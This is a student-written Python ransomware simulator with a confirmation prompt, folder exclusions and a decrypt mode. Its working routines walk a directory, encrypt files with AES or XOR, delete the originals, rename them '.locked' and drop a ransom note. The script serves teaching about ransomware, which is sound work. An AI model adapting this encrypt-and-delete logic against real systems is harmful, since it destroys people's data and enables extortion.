"""
Ransomware Simulator Generator - Group 3 - Co, Desamito, Maristela, San Luis, Tan

This tool demonstrates how ransomware operates by encrypting files and creating ransom notes,
while providing safe decryption capabilities for learning purposes.

"""

import os
import sys
from cryptography.fernet import Fernet  
import logging
from datetime import datetime
from pathlib import Path

RANSOM_EXTENSION = ".locked"
RANSOM_NOTE_FILENAME = "README_RANSOM.txt"
LOG_FILE = "ransom_simulator.log"
MAX_FILE_SIZE = 10 * 1024 * 1024
SUPPORTED_EXTENSIONS = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp3', '.mp4'}
EXCLUDED_EXTENSIONS = {'.exe', '.dll', '.sys', '.log', '.tmp'}  
XOR_KEY = b"education2025" 

def display_warning():
    """
    Display a warning message about the tool's educational purpose.

    """
    warning = """
        WARNING: RANSOMWARE SIMULATION TOOL

        This is an EDUCATIONAL tool designed to simulate ransomware behavior 
        in a CONTROLLED ENVIRONMENT.

        DO NOT run this tool on:
        - Personal files  
        - Systems containing important data

        By continuing, you acknowledge that this is for educational use only.
    """
    print(warning)
    confirmation = input("Type 'I UNDERSTAND' to continue or Ctrl+C to abort: ").strip()

    if confirmation != "I UNDERSTAND":  
        print("Confirmation not received! Exiting...")
        sys.exit(0)

    print("Proceeding with simulation...")

def find_encrypted_files(target_dir):
    """
    Find all encrypted (.locked) files in the target directory.

    """
    encrypted_files = []
    
    try:
        for root, _, files in os.walk(target_dir):  # Walk through all folders
            for file in files:
                if file.endswith(RANSOM_EXTENSION):  # Look for .locked files
                    file_path = os.path.join(root, file)
                    encrypted_files.append(file_path)
    except Exception as e:
        logging.error(f"Error finding encrypted files: {e}")
    
    return encrypted_files

def is_safe_file(file_path):
    """
    Determine if a file is safe to process based on size, extension, and location.

    """
    try:

        if os.path.getsize(file_path) > MAX_FILE_SIZE:  # Skip huge files
            return False

        file_ext = Path(file_path).suffix.lower()

        if file_ext in EXCLUDED_EXTENSIONS:  # Skip system files
            return False

        # Skip Windows system folders
        system_paths = ['windows', 'system32', 'program files']
        file_path_lower = file_path.lower()
        if any(sys_path in file_path_lower for sys_path in system_paths):
            return False

        # Test if the file is readable
        try:
            with open(file_path, 'rb') as f:
                f.read(1)  
        except (PermissionError, OSError):
            return False
        
        return True
    except (OSError, IOError):
        return False

def scan_directory(target_dir):
    """
    Recursively scan directory and return list of safe files to process.

    """
    if not os.path.isdir(target_dir):
        raise ValueError(f"Invalid directory: {target_dir}")
    
    file_list = []
    skipped_count = 0
    
    print(f"Scanning directory: {target_dir}")
    
    try:
        for root, _, files in os.walk(target_dir):  # Go through all subfolders
            for file in files:
                file_path = os.path.join(root, file)

                # Skip hidden files, logs, and already encrypted files
                if (file.startswith('.') or 
                    file == RANSOM_NOTE_FILENAME or 
                    file == LOG_FILE or
                    file.endswith(RANSOM_EXTENSION)):
                    skipped_count += 1
                    continue

                # Check if the is safe to mess with
                try:
                    if is_safe_file(file_path):
                        file_list.append(file_path)
                    else:
                        skipped_count += 1
                except Exception:
                    # Skip if can't access file
                    skipped_count += 1
                    continue
                    
    except PermissionError as e:
        logging.error(f"Permission denied accessing directory: {e}")
        raise ValueError(f"Cannot access directory: {target_dir}")
    
    print(f"\nFound {len(file_list)} files to process{', skipped ' + str(skipped_count) + ' files' if skipped_count > 0 else ''}")
    logging.info(f"Scanned {target_dir}: {len(file_list)} files found, {skipped_count} skipped")
    
    return file_list

def xor_encrypt_decrypt(data, key):
    """
    Encrypt or decrypt data using XOR cipher.

    """
    result = bytearray()
    key_len = len(key)
    
    # XOR each byte with the key
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % key_len])
    
    return bytes(result)

def simulate_encryption(file_list, encryption_method="rename", key=None):
    """
    Simulate encryption by renaming files.

    """
    encrypted_files = []
    failed_files = []
    
    print(f"Starting encryption simulation using {encryption_method} method...")
    
    for i, file_path in enumerate(file_list, 1):

        try:
            # Skip files that are already encrypted
            if file_path.endswith(RANSOM_EXTENSION):
                continue
                
            new_path = file_path + RANSOM_EXTENSION  # Add .locked extension
            print(f"\nProcessing {i}/{len(file_list)}: {os.path.basename(file_path)}")

            # Apply the chosen encryption method
            if encryption_method == "aes" and key:
                encrypt_file_aes(file_path, new_path, key)
            elif encryption_method == "xor" and key:
                encrypt_file_xor(file_path, new_path, key)
            else:
                os.rename(file_path, new_path)  # Just rename to add .locked
            
            encrypted_files.append(new_path)
            
        except (PermissionError, OSError) as e:
            failed_files.append(file_path)  # Skip protected files
            continue
        except Exception as e:
            logging.error(f"Error processing {file_path}: {str(e)}")
            failed_files.append(file_path)
            continue
    
    print(f"\nEncryption complete: {len(encrypted_files)} files encrypted{', ' + str(len(failed_files)) + ' failed' if failed_files else ''}")
    if failed_files:
        logging.warning(f"Failed to encrypt {len(failed_files)} files")
        
    return encrypted_files

def encrypt_file_aes(input_path, output_path, key):
    """
    Encrypt file contents using AES encryption.

    """
    fernet = Fernet(key)
    
    # Read the original file
    with open(input_path, 'rb') as f:
        original = f.read()
    
    # Encrypt the data
    encrypted = fernet.encrypt(original)
    
    # Write encrypted data to new file
    with open(output_path, 'wb') as f:
        f.write(encrypted)

    os.remove(input_path)  # Delete the original
    logging.info(f"AES encrypted: {input_path} -> {output_path}")

def encrypt_file_xor(input_path, output_path, key):
    """
    Encrypt file contents using XOR cipher.

    """
    # Read the original file
    with open(input_path, 'rb') as f:
        original = f.read()
    
    # Apply XOR encryption
    encrypted = xor_encrypt_decrypt(original, key)
    
    # Write encrypted data to new file
    with open(output_path, 'wb') as f:
        f.write(encrypted)

    os.remove(input_path)  # Delete the original
    logging.info(f"XOR encrypted: {input_path} -> {output_path}")

def encrypt_file(input_path, output_path, key):
    """
    Encrypt file using AES.

    """
    encrypt_file_aes(input_path, output_path, key)

def create_ransom_note(target_dir, encryption_method="rename"):
    """
    Create a ransom note file in the target directory with recovery instructions.

    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    note_content = f"""
        YOUR FILES HAVE BEEN ENCRYPTED! (SIMULATION)

        This is part of an ethical hacking educational project.

        Encryption Details:
        - Method: {encryption_method.upper()}
        - Timestamp: {timestamp}
        - Extension: {RANSOM_EXTENSION}

        TO RECOVER YOUR FILES:
        1. Run this tool again and select the decryption option
        2. Enter the same directory where files were encrypted
        3. Use the key that was displayed in the encryption process if necessary.
        4. Enter 'y' to confirm decryption.

        Educational Note:
        This demonstrates how ransomware operates. In real attacks, files would be 
        encrypted without the decryption key held by attackers because they want to
        extort money.
    """

    note_path = os.path.join(target_dir, RANSOM_NOTE_FILENAME)
    try:
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note_content)
        print(f"Ransom note created: {note_path}")
        logging.info(f"Ransom note created at: {note_path}")
    except Exception as e:
        logging.error(f"Failed to create ransom note: {e}")
        print(f"Warning: Could not create ransom note: {e}")

def decrypt_files(file_list, encryption_method="rename", key=None):
    """
    Restore original filenames and decrypt contents if encrypted.

    """
    decrypted_files = []
    failed_files = []
    
    print(f"Starting decryption using {encryption_method} method...")
    
    for i, file_path in enumerate(file_list, 1):
        try:
            if not file_path.endswith(RANSOM_EXTENSION):  # Only decrypt .locked files
                continue
                
            # Remove .locked extension to get original name
            original_path = file_path[:-len(RANSOM_EXTENSION)]
            print(f"\nDecrypting {i}/{len(file_list)}: {os.path.basename(original_path)}")
            
            # Apply the correct decryption method
            if encryption_method == "aes" and key:
                decrypt_file_aes(file_path, original_path, key)
            elif encryption_method == "xor" and key:
                decrypt_file_xor(file_path, original_path, key)
            else:
                os.rename(file_path, original_path)  # Just rename back
            
            decrypted_files.append(original_path)
            
        except (PermissionError, OSError) as e:
            failed_files.append(file_path)  # Skip protected files
            continue
        except Exception as e:
            logging.error(f"Error decrypting {file_path}: {str(e)}")
            failed_files.append(file_path)
            continue
    
    print(f"\nDecryption complete: {len(decrypted_files)} files restored{', ' + str(len(failed_files)) + ' failed' if failed_files else ''}")
    if failed_files:
        logging.warning(f"Failed to decrypt {len(failed_files)} files")
        
    return decrypted_files

def decrypt_file_aes(input_path, output_path, key):
    """
    Decrypt file using AES decryption.

    """
    fernet = Fernet(key)
    
    # Read the encrypted file
    with open(input_path, 'rb') as f:
        encrypted = f.read()
    
    # Try to decrypt it
    try:
        decrypted = fernet.decrypt(encrypted)
    except Exception as e:
        raise ValueError(f"AES decryption failed! Error: {e}")
    
    # Write the decrypted data
    with open(output_path, 'wb') as f:
        f.write(decrypted)
    
    os.remove(input_path)  # Remove the encrypted file
    logging.info(f"AES decrypted: {input_path} -> {output_path}")

def decrypt_file_xor(input_path, output_path, key):
    """
    Decrypt file using XOR cipher.

    """
    # Read the encrypted file
    with open(input_path, 'rb') as f:
        encrypted = f.read()
    
    # XOR decryption (same as encryption)
    decrypted = xor_encrypt_decrypt(encrypted, key)
    
    # Write the decrypted data
    with open(output_path, 'wb') as f:
        f.write(decrypted)
    
    os.remove(input_path)  # Remove the encrypted file
    logging.info(f"XOR decrypted: {input_path} -> {output_path}")

def decrypt_file(input_path, output_path, key):
    """
    Decrypt file using AES.

    """
    decrypt_file_aes(input_path, output_path, key)

def setup_logging():
    """
    Configure comprehensive logging system for tracking all operations.

    """
    # Clear any old log handlers
    for handler in logging.root.handlers[:]:
        logging.root.removeHandler(handler)
    
    # Set up how log messages should look
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
    )
    
    # Log to file
    file_handler = logging.FileHandler(LOG_FILE, mode='a', encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    
    # Also show errors on screen
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.ERROR)
    console_handler.setFormatter(logging.Formatter('%(levelname)s: %(message)s'))
    
    # Set up the main logger
    logging.basicConfig(
        level=logging.DEBUG,
        handlers=[file_handler, console_handler]
    )
    
    # Log that to start a new session
    logging.info("\nRansomware Simulator Session Started")
    logging.info(f"Working directory: {os.getcwd()}\n")

def log_operation(operation, file_list, additional_info=None):
    """
    Log file operations with detailed information.

    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Log basic operation info
    logging.info(f"Operation: {operation}")
    logging.info(f"Files affected: {len(file_list)}")
    
    # Log any extra details
    if additional_info:
        for key, value in additional_info.items():
            logging.info(f"{key}: {value}")

    # Log each file that was processed
    for file_path in file_list:
        logging.debug(f"  {operation}: {file_path}")
    
    # Create a simple summary log file
    try:
        with open(LOG_FILE.replace('.log', '_summary.log'), 'a', encoding='utf-8') as log:
            log.write(f"\n{timestamp} - {operation} ({len(file_list)} files):\n")
            if additional_info:
                for key, value in additional_info.items():
                    log.write(f"  {key}: {value}\n")
            for file in file_list[:10]:  
                log.write(f"  {file}\n")
            if len(file_list) > 10:
                log.write(f"  ... and {len(file_list) - 10} more files\n")
    except Exception as e:
        logging.error(f"Failed to write summary log: {e}")

def get_operation_mode():
    """
    Get operation mode choice from user.

    """
    print("\nSelect operation mode:")
    print("1. Encrypt files (simulate ransomware attack)")
    print("2. Decrypt files (recover encrypted files)")
    
    while True:
        choice = input("\nEnter choice (1 or 2): ").strip()
        if choice == "1":
            return "encrypt"  
        elif choice == "2":
            return "decrypt"  
        else:
            print("Invalid choice. Please enter 1 or 2.")

def get_encryption_method():
    """
    Get encryption method choice from user with validation.

    """
    print("\nSelect encryption method:")
    print("1. Rename only (changes file extensions)")
    print("2. XOR cipher (reversible encryption)")
    print("3. AES encryption (strong encryption)")
    
    while True:
        choice = input("\nEnter choice (1-3): ").strip()
        if choice == "1":
            return "rename", False  # Just rename, no key needed
        elif choice == "2":
            return "xor", True  # XOR encryption, key needed
        elif choice == "3":
            return "aes", True  # AES encryption, key needed
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")

def get_encryption_method_from_ransom_note(target_dir):
    """
    Read the encryption method from the ransom note.

    """
    note_path = os.path.join(target_dir, RANSOM_NOTE_FILENAME)
    
    try:
        with open(note_path, 'r', encoding='utf-8') as f:
            content = f.read()

        # Look for the line that tells us the encryption method
        for line in content.split('\n'):
            # Try both possible formats in the ransom note
            if line.startswith('- Encryption method used:'):
                method = line.split(':', 1)[1].strip().lower()
                if method == "rename":
                    return "rename", False
                elif method == "xor":
                    return "xor", True
                elif method == "aes":
                    return "aes", True
            elif line.strip().startswith('- Method:'):
                method = line.split(':', 1)[1].strip().lower()
                if method == "rename":
                    return "rename", False
                elif method == "xor":
                    return "xor", True
                elif method == "aes":
                    return "aes", True
        
    except Exception as e:
        logging.error(f"Could not read ransom note: {e}")
    
    return None, False 

def validate_directory(target_dir):
    """
    Validate that the target directory is safe for simulation.

    """
    # Convert to full path
    target_dir = os.path.abspath(target_dir)

    # Skip dangerous Windows folders
    dangerous_paths = [
        'c:\\windows',
        'c:\\program files',
        'c:\\program files (x86)',
        'c:\\users\\' + os.environ.get('USERNAME', '') + '\\documents',
        'c:\\users\\' + os.environ.get('USERNAME', '') + '\\desktop'
    ]
    
    target_lower = target_dir.lower()
    for dangerous in dangerous_paths:
        if target_lower.startswith(dangerous.lower()):
            print(f"Error: Cannot target system directory: {target_dir}")
            return False

    # Warn if the folder name doesn't look like a test folder
    if not target_dir.lower().endswith(('test', 'lab', 'sandbox', 'demo')):
        print(f"Note: Directory name doesn't suggest a test environment.")
        print(f"Recommended: Create a test directory like 'ransomware_test'")
        confirm = input("Continue anyway? (y/n): ").lower()
        if confirm != 'y':
            return False
    
    return True

def main():
    """
    Handles user interaction, validation, encryption/decryption operations,
    and comprehensive logging of all activities.

    """
    print("\nRansomware Simulator Generator")

    display_warning()  # Show safety warning and get confirmation
    setup_logging()    # Start logging everything
    
    try:
        # Ask user what they want to do
        operation_mode = get_operation_mode()

        # Get the target directory and make sure it's safe
        while True:
            target_dir = input("Enter target directory path: ").strip()
            if not target_dir:
                print("Please enter a directory path.")
                continue
                
            if not os.path.isdir(target_dir):
                print("Error: Directory does not exist.")
                continue
                
            if validate_directory(target_dir):  # Check if it's safe to use
                break
        
        target_dir = os.path.abspath(target_dir)
        print(f"Target directory: {target_dir}")
        
        if operation_mode == "encrypt":
            # Lock files
            print("\nENCRYPTION MODE")
            encryption_method, requires_key = get_encryption_method()
            
            # Generate or use encryption key if needed
            key = None
            if requires_key:
                if encryption_method == "aes":
                    key = Fernet.generate_key()  # Generate strong AES key
                    print(f"\nIMPORTANT: Save this AES key for decryption!")
                    print(f"Key: {key.decode()}")
                    print("Note: Without this key, files cannot be decrypted!")
                    input("\nPress Enter after you have saved the key...")
                elif encryption_method == "xor":
                    key = XOR_KEY  # Use the simple demo key
                    print(f"\nIMPORTANT: Save this XOR key for decryption!")
                    print(f"Key: {key.decode()}")
                    print("Note: Without this key, files cannot be decrypted!")
                    input("\nPress Enter after you have saved the key...")

            # Find all the files that can be safely encrypted
            try:
                files = scan_directory(target_dir)
                if len(files) == 0:
                    print("No files found to encrypt. Exiting.")
                    return
            except ValueError as e:
                print(f"Error: {e}")
                return

            # Confirm before doing anything
            print(f"\nReady to simulate encryption on {len(files)} files using {encryption_method} method.")
            if input("Proceed with encryption simulation? (y/n): ").lower() != 'y':
                print("Encryption cancelled.")
                return

            print("\nStarting encryption simulation...")
            
            # Do the actual encryption
            encrypted_files = simulate_encryption(files, encryption_method, key)
            
            if encrypted_files:
                create_ransom_note(target_dir, encryption_method)  # Create the ransom message

                # Log the successful encryption
                log_info = {
                    "method": encryption_method,
                    "target_directory": target_dir,
                    "files_encrypted": len(encrypted_files),
                    "key_used": "Yes" if requires_key else "No"
                }
                log_operation("ENCRYPTION_SIMULATION", encrypted_files, log_info)
                
                print(f"\nEncryption simulation complete!")
                print(f"Files encrypted: {len(encrypted_files)}")
                print(f"Log file: {LOG_FILE}")
                
                if requires_key:
                    print(f"\nRemember your decryption key: {key.decode()}")
                    print("Run this tool again in 'decrypt' mode to restore files.")
            else:
                print("No files were encrypted. Check the log for details.")
        
        else:
            # Unlock files
            print("\nDECRYPTION MODE\n")
            encrypted_files = find_encrypted_files(target_dir)  # Look for .locked files
            
            if not encrypted_files:
                print("No encrypted files found in the specified directory.")
                return
            
            print(f"Found {len(encrypted_files)} encrypted files")
            # Try to figure out what encryption was used
            encryption_method, requires_key = get_encryption_method_from_ransom_note(target_dir)
            
            if not encryption_method:
                print("Could not determine encryption method from ransom note.")
                print("The ransom note may be missing or corrupted.")
                return
            
            print(f"Encryption method detected: {encryption_method.upper()}")

            # Get decryption key if needed
            key = None
            if requires_key:
                key_input = input(f"Enter the {encryption_method.upper()} decryption key: ").strip()
                if not key_input:
                    print("No key provided. Cannot decrypt.")
                    return
                
                key = key_input.encode()  # Convert to bytes

                # Make sure AES key is valid format
                if encryption_method == "aes":
                    try:
                        Fernet(key)  # Test if key works
                    except:
                        print("Invalid AES key format.")
                        return

            # Confirm before decrypting
            if input(f"\nProceed with decryption of {len(encrypted_files)} files using {encryption_method} method? (y/n): ").lower() != 'y':
                print("Decryption cancelled.")
                return
            
            print("\nStarting decryption...")
            
            # Do the actual decryption
            decrypted_files = decrypt_files(encrypted_files, encryption_method, key)
            
            if decrypted_files:
                # Log the successful decryption
                log_info = {
                    "method": encryption_method,
                    "target_directory": target_dir,
                    "files_decrypted": len(decrypted_files)
                }
                log_operation("DECRYPTION", decrypted_files, log_info)
                
                print(f"\nDecryption complete!")
                print(f"Files restored: {len(decrypted_files)}")

                # Clean up the ransom note 
                note_path = os.path.join(target_dir, RANSOM_NOTE_FILENAME)
                try:
                    os.remove(note_path)
                    print("Ransom note removed.")
                except:
                    pass  
            else:
                print("No files were decrypted. Check the log for details.")
        
        print(f"\nSession complete. Check {LOG_FILE} for detailed logs.")
        
    except KeyboardInterrupt:  # User pressed Ctrl+C
        print("\n\nOperation interrupted by user.")
        logging.info("Operation interrupted by user (Ctrl+C)")
    except Exception as e:  # Something unexpected went wrong
        error_msg = f"Unexpected error: {e}"
        print(f"\nError: {error_msg}")
        logging.error(error_msg, exc_info=True)
    finally:
        logging.info("Ransomware simulation session ended\n")

if __name__ == "__main__":
    main()